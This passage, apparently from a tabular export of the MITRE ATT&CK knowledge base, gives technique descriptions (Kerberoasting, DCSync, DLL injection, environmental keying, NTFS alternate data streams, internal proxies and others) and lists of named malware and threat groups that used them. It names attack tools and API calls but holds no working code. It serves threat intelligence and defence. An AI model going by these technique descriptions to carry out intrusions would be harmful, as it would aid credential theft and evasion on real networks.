C4] can create Windows system services for execution.', '[NotPetya] can use [PsExec] to help propagate itself across a network.', '[Chimera] has used [PsExec] to deploy beacons on compromised systems.', '[RemoteCMD] can execute commands remotely by creating a new service on the remote system.', '[HermeticWizard] can use `OpenRemoteServiceManager` to create a service.', '[TinyTurla] can install itself as a service on compromised machines.', '[Bad Rabbit] drops a file named <code>infpub.dat</code>into the Windows directory and is executed through SCManager and <code>rundll.exe</code>.', '[Ragnar Locker] has used sc.exe to execute a service that it creates.', '[APT39] has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.', '[PoshC2] contains an implementation of [PsExec] for remote execution.', '[Mafalda] can create a remote service, let it run once, and then delete it.', '[xCmd] can be used to execute binaries on remote systems by creating and starting a service.', 'During [Operation Wocao] threat actors created services on remote systems for execution purposes.', '[Winexe] installs a service on the remote system, executes the command, then uninstalls the service.', '[BBSRAT] can start, stop, or delete services.', '[Clambling] can create and start services on a compromised host.', '[Proxysvc] registers itself as a service on the victim’s machine to run as a standalone process.', 'The <code>net start</code> and <code>net stop</code> commands can be used in [Net] to execute or stop Windows services.', '[SLOTHFULMEDIA] has the capability to start services.', '[gh0st RAT] can execute its service if the Service key exists. If the key does not exist, [gh0st RAT] will create and run the service.', '[Impacket] contains various modules emulating other service execution tools such as [PsExec]', '[HyperBro] has the ability to start and stop a specified service.', '[Shamoon] creates a new service named “ntssrv” to execute the payload. [Shamoon] can also spread via [PsExec]', '[Empire] can use [PsExec] to execute a payload on a remote host.', '[Okrum] loader can create a new service named NtmsSvc to execute the payload.', '[APT41] used  svchost.exe and [Net] to execute a system service installed to launch a [Cobalt Strike] BEACON loader.', '[Silence] has used [Winexe] to install a service on the remote system.', '[Ke3chang] has used a tool known as RemoteExec (similar to [PsExec] to remotely execute batch scripts and binaries.', '[Blue Mockingbird] has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the ""wercplsupport"" service.\t', '[HOPLIGHT] has used svchost.exe to execute a malicious DLL .', '[WhisperGate] can download and execute AdvancedRun.exe via `sc.exe`.', '[Wingbird] uses services.exe to register a new autostart service named ""Audit Service"" using a copy of the local lsass.exe file.', '[Net Crawler] uses [PsExec] to perform remote service manipulation to execute a copy of itself as part of lateral movement.', '[LoudMiner] started the cryptomining virtual machine as a service on the infected machine.', '[Pysa] has used [PsExec] to copy and execute the ransomware.', 'During [Operation Honeybee] threat actors ran <code>sc start</code> to start the COMSysApp as part of the service hijacking and <code>sc stop</code> to stop and reconfigure the COMSysApp.', '[Winnti for Windows] can run as a service using svchost.exe.', '[APT32] backdoor has used Windows services as a way to execute its malicious payload. ', '[Pandora] has the ability to install itself as a Windows service.', 'Microsoft Sysinternals [PsExec] is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.', '[Koadic] can run a command on another machine using [PsExec]', '[FIN6] has created Windows services to execute encoded PowerShell commands.', '[Attor] dispatcher can be executed as a service.', '[Olympic Destroyer] utilizes [PsExec] to help propagate itself across a network.', '[WastedLocker] can execute itself as a service.', '[HermeticWiper] can create system services to aid in executing the payload.', 'Operators deploying [Netwalker] have used psexec and certutil to retrieve the [Netwalker] payload.', '[StrongPity] can install a service to execute itself as a service.', '[SysUpdate] can manage services and processes.', '[ZxShell] can create a new service for execution.', '[APT38] has created new services or modified existing ones to run executables, commands, or scripts.', ""[Wizard Spider] has used `services.exe` to execute scripts and executables during lateral movement within a victim's network. [Wizard Spider] has also used batch scripts that leverage [PsExec] to execute a previously transferred ransomware payload on a victim's network."", '[Anchor] can create and execute services to load its payload.', '[Honeybee] launches a DLL file that gets executed as a service using svchost.exe', '[Operation Wocao] has created services on remote systems for execution purposes.', '[Cobalt Strike] can use [PsExec] to execute a payload on a remote host. It can also use Service Control Manager to start new services.']",False
T1078.004,Cloud Accounts,"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.   Service or user accounts may be targeted by adversaries through [Brute Force] [Phishing] or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services] High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools] to run commands on hybrid-joined devices.  An adversary may create long lasting [Additional Cloud Credentials] on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication.   Cloud accounts may also be able to assume [Temporary Elevated Cloud Access] or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API] or other methods.  ","['During the [SolarWinds Compromise] [APT29] used a compromised O365 administrator account to create a new Service Principal.', '[APT29] has gained access to a global administrator account in Azure AD and has used `Service Principal` credentials in Exchange.', '[APT5] has accessed Microsoft M365 cloud environments using stolen credentials. ', '[ROADTools] leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.\t', '[APT28] has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.', 'During [C0027] [Scattered Spider] leveraged compromised credentials from victim users  to authenticate to Azure tenants.', '[Peirates] can use stolen service account tokens to perform its operations.', '[Pacu] leverages valid cloud accounts to perform most of its operations.', '[APT33] has used compromised Office 365 accounts in tandem with [Ruler] in an attempt to gain control of endpoints.', '[LAPSUS$] has used compromised credentials to access cloud assets within a target organization.', '[Ke3chang] has used compromised credentials to sign into victims’ Microsoft 365 accounts.', '[APT29] has used a compromised O365 administrator account to create a new Service Principal.']",False
T1480.001,Environmental Keying,"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails] that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.  Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).  Similar to [Obfuscated Files or Information] adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.  Like other [Execution Guardrails] environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion] While use of [Virtualization/Sandbox Evasion] may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.","['[Equation] has been observed utilizing environmental keying in payload delivery.', ""[APT41] has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. [APT41] has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number."", '[ROKRAT] relies on a specific victim hostname to execute and decrypt important strings.', '[Ninja] can store its final payload in the Registry under `$HKLM\\SOFTWARE\\Classes\\Interface\\` encrypted with a dynamically generated key based on the drive’s serial number.', '[InvisiMole] can use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.', '[PowerPunch] can use the volume serial number from a target host to generate a unique XOR key for the next stage payload.', 'The [Winnti for Windows] dropper component can verify the existence of a single command line parameter and either terminate if it is not found or later use it as a decryption key.']",False
T1564.004,NTFS File Attributes,"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).      Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.  ","['The [Regin] malware platform uses Extended Attributes to store encrypted executables.', '[APT32] used NTFS alternate data streams to hide their payloads.', '[Valak] has the ability save and execute files as alternate data streams (ADS).', '[LoJax] has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.', '[esentutl] can be used to read and write alternate data streams.', '[Expand] can be used to download or copy a file into an alternate data stream.', '[PowerDuke] hides many of its backdoor payloads in an alternate data stream (ADS).', 'The DEADEYE.EMBED variant of [DEADEYE] can embed its payload in an alternate data stream of a local file.', 'If the victim is using PowerShell 3.0 or later, [POWERSOURCE] writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in <code>%PROGRAMDATA%\\Windows\\</code>.', '[WastedLocker] has the ability to save and execute files as an alternate data stream (ADS).', '[BitPaymer] has copied itself to the <code>:bin</code> alternate data stream of a newly created file.', '[Astaroth] can abuse alternate data streams (ADS) to store content for malicious payloads.', '[Gazer] stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.', 'Some variants of the [Zeroaccess] Trojan have been known to store data in Extended Attributes.', '[Anchor] has used NTFS to hide files.']",False
T1558.003,Kerberoasting,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force]   Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).  Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force] attacks that may expose plaintext credentials.   This same behavior could be executed using service tickets captured from network traffic.  Cracked hashes may enable [Persistence] [Privilege Escalation] and [Lateral Movement] via access to [Valid Accounts]","['[Rubeus] can use the `KerberosRequestorSecurityToken.GetRequest` method to request kerberoastable service tickets.', '[Impacket] modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.', '[Empire] uses [PowerSploit] <code>Invoke-Kerberoast</code> to request service tickets and return crackable ticket hashes.', '[Wizard Spider] has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.', 'During [Operation Wocao] threat actors used [PowerSploit] `Invoke-Kerberoast` module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.', '[SILENTTRINITY] contains a module to conduct Kerberoasting.', 'During the [SolarWinds Compromise] [APT29] obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.', '[PowerSploit] <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes.', '[FIN7] has used Kerberoasting PowerShell commands such as, `Invoke-Kerberoast` for credential access and to enable lateral movement.', '[Brute Ratel C4] can decode Kerberos 5 tickets and convert it to hashcat format for subsequent cracking.', '[APT29] obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.', '[UNC2452] obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.', ""[Operation Wocao] has used PowerSploit's Invoke-Kerberoast module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.""]",
T1003.006,DCSync,"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.  Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket] for use in [Pass the Ticket] or change an account's password as noted in [Account Manipulation]  DCSync functionality has been included in the ""lsadump"" module in [Mimikatz] Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.","['[Mimikatz] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DCSync/NetSync.', '[Earth Lusca] has used a <code>DCSync</code> command with [Mimikatz] to retrieve credentials from an exploited controller.', 'During [C0027] [Scattered Spider] performed domain replication.', 'During [Operation Wocao] threat actors used [Mimikatz] DCSync to dump credentials from the memory of the targeted system. ', '[LAPSUS$] has used DCSync attacks to gather credentials for privilege escalation routines.', 'During the [SolarWinds Compromise] [APT29] used privileged accounts to replicate directory service data with domain controllers.', '[APT29] leveraged privileged accounts to replicate directory service data with domain controllers.', '[UNC2452] leveraged privileged accounts to replicate directory service data with domain controllers.', ""[Operation Wocao] has used Mimikatz's DCSync to dump credentials from the memory of the targeted system.\t""]",
T1053.002,At,"Adversaries may abuse the [at] utility to perform task scheduling for initial or recurring execution of malicious code. The [at] utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task] [schtasks] in Windows environments, using [at] requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.  On Linux and macOS, [at] may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at] If the <code>at.deny</code> exists and is empty, global use of [at] is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at]  Adversaries may use [at] to execute programs at system startup or on a scheduled basis for [Persistence] [at] can also be abused to conduct remote [Execution] as part of [Lateral Movement] and/or to run a process under the context of a specified account (such as SYSTEM).  In Linux environments, adversaries may also abuse [at] to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at] may also be used for [Privilege Escalation] if the binary is allowed to run as superuser via <code>sudo</code>.","['[Threat Group-3390] actors use [at] to schedule tasks to run self-extracting RAR archives, which install [HTTPBrowser] or [PlugX] on other victims on a network.', '[CrackMapExec] can set a scheduled task on the target system to execute commands remotely using [at]', '[APT18] actors used the native [at] Windows task scheduler tool to use scheduled tasks for execution on a victim network.', '[BRONZE BUTLER] has used [at] to register a scheduled task to execute malware during lateral movement.', '[MURKYTOP] has the capability to schedule remote AT jobs.', '[at] can be used to schedule a task on a system to be executed at a specific date or time.']",False
T1055.001,Dynamic-link Library Injection,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.    DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).    Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).   Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.   Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ","['[Heyoka Backdoor] can inject a DLL into rundll32.exe for execution.', '[Saint Bot] has injected its DLL component into `EhStorAurhn.exe`.', '[Emissary] injects its DLL file into a newly spawned Internet Explorer process.', '[Remsec] can perform DLL injection.', '[DarkTortilla] can use a .NET-based DLL named `RunPe6` for process injection.', '[BlackEnergy] injects its DLL component into svchost.exe.', '[Turla] has used Metasploit to perform reflective DLL injection in order to escalate privileges.', '[PS1] can inject its payload DLL Into memory.', '[Koadic] can perform process injection by using a reflective DLL.', 'After decrypting itself in memory, [RARSTONE] downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system.', '[Cobalt Strike] has the ability to load DLLs via reflective injection.', '[SDBbot] has the ability to inject a downloaded DLL into a newly created rundll32.exe process.', '[Metamorfo] has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).', ""[ComRAT] has injected its orchestrator DLL into explorer.exe. [ComRAT] has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process."", '[Socksbot] creates a suspended svchost process and injects its DLL into it.', 'The [Bumblebee] loader can support the `Dij` command which gives it the ability to inject DLLs into the memory of other processes.', '[Lizar] has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading. ', '[Malteiro] has injected [Mispadu] DLL into a process.', 'The [FunnyDream] FilepakMonitor component can inject into the Bka.exe process using the `VirtualAllocEx`, `WriteProcessMemory` and `CreateRemoteThread` APIs to load the DLL component.', '[Maze] has injected the malware DLL into a target process.\t', '[Matryoshka] uses reflective DLL injection to inject the malicious library and execute the RAT.', '[Pupy] can migrate into another process using reflective DLL injection.', '[PowerSploit] contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.', '[FinFisher] injects itself into various processes depending on whether it is low integrity or high integrity.', '[PipeMon] can inject its modules into various processes using reflective DLL loading.', '[Dyre] injects into other processes to load modules.', '[BackdoorDiplomacy] has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.', '[Get2] has the ability to inject DLLs into processes.', '[Taidoor] can perform DLL loading.', '[RATANKBA] performs a reflective DLL injection using a given pid.', '[BADHATCH] has the ability to execute a malicious DLL by injecting into `explorer.exe` on a compromised machine.', '[MegaCortex] loads <code>injecthelper.dll</code> into a newly created <code>rundll32.exe</code> process.', '[Stuxnet] injects an entire DLL into an existing, newly created, or preselected trusted process.', 'During [C0015] the threat actors used a DLL named `D8B3.dll` that was injected into the Winlogon process. ', '[Leviathan] has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.', 'If running in a Windows environment, [Kazuar] saves a DLL to disk that is injected into the explorer.exe process to execute the payload. [Kazuar] can also be configured to inject and execute within specific processes.', '[Duqu] will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).', '[PoisonIvy] can inject a malicious DLL into a process.', '[Derusbi] injects itself into the secure shell (SSH) process.', '[ZxShell] is injected into a shared SVCHOST process. ', 'An executable dropped onto victims by [Putter Panda] aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).', '[Gelsemium] has the ability to inject DLLs into specific processes.', '[HIDEDRV] injects a DLL for [Downdelph] into the explorer.exe process.', '[Carbon] has a command to inject code into a process.', 'A [Lazarus Group] malware sample performs reflective DLL injection.', '[Tropic Trooper] has injected a DLL backdoor into dllhost.exe and svchost.exe.', '[IronNetInjector] has the ability to inject a DLL into running processes, including the [IronNetInjector] DLL into explorer.exe.', '[TajMahal] has the ability to inject DLLs for malicious plugins into running processes.', '[Mongall] can inject a DLL into `rundll32.exe` for execution. ', '[Conti] has loaded an encrypted DLL into memory and then executes it.', '[Ramsay] can use <code>ImprovedReflectiveDLLInjection</code> to deploy components. ', '[Uroburos] can use DLL injection to load embedded files and modules.', '[Carberp] bootkit can inject a malicious DLL into the address space of running processes.', '[SombRAT] can execute <code>loadfromfile</code>, <code>loadfromstorage</code>, and <code>loadfrommem</code> to inject a DLL  from disk, storage, or memory respectively.', '[Sykipot] injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.', '[Emotet] has been observed injecting in to Explorer.exe and other processes. ', '[Aria-body] has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.', 'The [Netwalker] DLL has been injected reflectively into the memory of a legitimate running process.\t', '[TA505] has been seen injecting a DLL into winword.exe.', '[Elise] injects DLL files into iexplore.exe.', '[Wizard Spider] has injected malicious DLLs into memory with read, write, and execute permissions.', '[ShadowPad] has injected a DLL into svchost.exe.']",False
T1588.005,Exploits,"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.  In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals. In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).  An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.  Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application] [Exploitation for Client Execution] [Exploitation for Privilege Escalation] [Exploitation for Defense Evasion] [Exploitation for Credential Access] [Exploitation of Remote Services] and [Application or System Exploitation]",['[Kimsuky] has obtained exploit code for various CVEs.'],
T1056.004,Credential API Hooking,"Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike [Keylogging]  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:  * **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. * **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored. * **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow. ","['[Zeus Panda] hooks processes by leveraging its own IAT hooked functions.', '[Carberp] has hooked several Windows API functions to steal credentials.', '[FinFisher] hooks processes by modifying IAT pointers to CreateWindowEx.', '[Ursnif] has hooked APIs to perform a wide variety of information theft, such as monitoring traffic from browsers.', '[ZxShell] hooks several API functions to spawn system threads. ', '[PLATINUM] is capable of using Windows hook interfaces for information gathering such as credential access.', '[Zebrocy] installs an application-defined Windows hook to get notified when a network drive has been attached, so it can then use the hook to call its RecordToFile file stealing method.', '[RDFSNIFFER] hooks several Win32 API functions to hijack elements of the remote system management user-interface.', '[Empire] contains some modules that leverage API hooking to carry out tasks, such as netripper.', '[TrickBot] has the ability to capture RDP credentials by capturing the <code>CredEnumerateA</code> API ', ""[NOKKI] uses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine.""]",
T1546.007,Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.  Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",['[netsh] can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.'],False
T1566.003,Spearphishing via Service,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.  A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.","['[CURIUM] has used social media to deliver malicious files to victims.', '[Windshift] has used fake personas on social media to engage and target victims.\t', '[Ajax Security Team] has used various social media channels to spearphish victims.', '[EXOTIC LILY] has used the e-mail notification features of legitimate file sharing services for spearphishing.', '[Ninja] has been distributed to victims via the messaging app Telegram.', '[ToddyCat] has sent loaders configured to run [Ninja] as zip archives via Telegram.', 'During [Operation Dream Job] [Lazarus Group] sent victims spearphishing messages via LinkedIn concerning fictitious jobs.', '[FIN6] has used fake job advertisements sent via LinkedIn to spearphish targets.', '[APT29] has used the legitimate mailing service Constant Contact to send phishing e-mails.', '[OilRig] has used LinkedIn to send spearphishing links.', '[Dark Caracal] spearphished victims via Facebook and Whatsapp.', '[Lazarus Group] has used social media platforms, including LinkedIn and Twitter, to send spearphishing messages.', '[Magic Hound] used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.', '[Lazarus Group] has used fake job advertisements sent via LinkedIn to spearphish victims. ']",False
T1090.001,Internal Proxy,"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN] ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.  By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.","['[Pay2Key] has designated machines in the compromised network to serve as reverse proxy pivot points to channel communications with C2.', '[Duqu] can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.', 'During the [SolarWinds Compromise] [APT29] used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of [Cobalt Strike] to use a network pipe over SMB.', '[CHOPSTICK] used a proxy server between victims and the C2 server.', '[FIN13] has utilized a proxy tool to communicate between compromised assets.', '[Drovorub] can use a port forwarding rule on its agent module to relay network traffic through the client module to a remote host on the same network.', '[Cobalt Strike] can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.', '[Higaisa] discovered system proxy settings and used them if available.', '[Mafalda] can create a named pipe to listen for and send data to a named pipe-based C2 server.', '[Mythic] can leverage a peer-to-peer C2 profile between agents.\t\t', 'The [Winnti for Windows] HTTP/S C2 mode can make use of a local proxy.', '[Strider] has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.', '[MiniDuke] can can use a named pipe to forward communications from one compromised machine with internet access to other compromised machines.', '[FatDuke] can used pipes to connect machines with restricted internet access to remote machines via other infected hosts.', '[Kazuar] has used internal nodes on the compromised network for C2 communications.', 'The ""ZJ"" variant of [BACKSPACE] allows ""ZJ link"" infections with Internet access to relay traffic from ""ZJ listen"" to a command server.', '[Volt Typhoon] has used the built-in [netsh] `port proxy` command to create proxies on compromised systems to facilitate access.', '[Ninja] can proxy C2 communications including to and from internal agents without internet connectivity.', '[Turla] has compromised internal network systems to act as a proxy to forward traffic to C2.', '[InvisiMole] can function as a proxy to create a server that relays communication between the client and C&C server, or between two clients.', ""[Lazarus Group] has used a compromised router to serve as a proxy between a victim network's corporate and restricted segments."", 'During [Operation Wocao] threat actors proxied traffic through multiple infected systems.', '[metaMain] can create a named pipe to listen for and send data to a named pipe-based C2 server.', '[Hikit] supports peer connections.', '[APT39] used custom tools to create SOCK5 and custom protocol proxies between infected hosts.', '[Stuxnet] installs an RPC server for P2P communications.', '[APT29] has used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of [Cobalt Strike] to use a network pipe over SMB during the 2020 SolarWinds intrusion.', '[UNC2452] configured at least one instance of [Cobalt Strike] to use a network pipe over SMB during the 2020 SolarWinds intrusion.', '[Operation Wocao] can proxy traffic through multiple infected systems.', '[Cobalt Strike] can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.']",False
T1102.001,Dead Drop Resolver,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.  Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.  Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","['[Astaroth] can store C2 information on cloud hosting services such as AWS and CloudFlare and websites like YouTube and Facebook.', '[BADNEWS] collects C2 information via a dead drop resolver.', 'The [KEYPLUG] Windows variant has retrieved C2 addresses from encoded data in posts on tech community forums.', 'Some [MiniDuke] components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.', '[Grandoreiro] can obtain C2 information from Google Docs.', '[Metamorfo] has used YouTube to store and hide C&C server domains.', '[PlugX] uses Pastebin to store C2 addresses.', '[CharmPower] can retrieve C2 domain information from actor-controlled S3 buckets.', '[Rocke] has used Pastebin to check the version of beaconing malware and redirect to another 